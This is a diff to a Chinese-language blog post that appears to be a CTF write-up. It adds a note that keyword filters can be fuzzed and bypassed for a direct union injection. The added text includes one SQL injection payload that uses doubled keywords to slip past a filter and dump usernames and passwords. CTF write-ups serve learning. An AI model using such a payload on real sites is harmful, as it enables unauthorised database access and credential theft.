@@ -747,6 +747,9 @@ v <span class="token operator">=</span> <span class="token string">""</span>
     main<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 <p>跑flag即可。</p>
+<p>emmm以上是盲注的方法，那么下面还有通过fuzz得到过滤关键字，然后绕过直接注的，因为这是有回显的一个注入嘛。</p>
+<p><code>id=sd&#39; unifromon selselectect (seselectlect group_concat(username,&#39;:&#39;,password)frfromom web.user),2#</code></p>
+<p>总之方法总是多种多样的。</p>
 </blockquote>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><blockquote>
 <p>至于二进制，还在学习之中，密码学的RSA,和AES也需要抽个时间来深入研究一下。</p>
